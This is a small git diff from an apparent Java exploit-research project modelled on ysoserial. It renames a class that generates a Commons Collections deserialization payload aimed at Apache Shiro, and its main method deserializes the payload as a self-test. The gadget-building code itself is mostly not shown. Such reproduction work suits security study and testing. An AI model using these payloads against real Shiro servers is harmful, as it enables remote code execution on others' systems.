@@ -38,7 +38,7 @@ import static com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil.s
 /*
   created by xjj on 2023/2/4
  */
-public class CommonCollectionsShiro {
+public class CommonsCollectionsShiro {
     // 由于在复现shiro的时候发现传入数组不行(InvokerTransformer[]) 于是修改payload
     public byte[] getPayload(String exp) throws Exception {
         class TFactory extends TransformerFactoryImpl {
@@ -70,7 +70,7 @@ public class CommonCollectionsShiro {
     }
 
     public static void main(String[] args) throws Exception {
-        byte[] payload = new CommonCollectionsShiro().getPayload("");
+        byte[] payload = new CommonsCollectionsShiro().getPayload("");
         SerializationUtil.deserialize(payload);
     }
 }
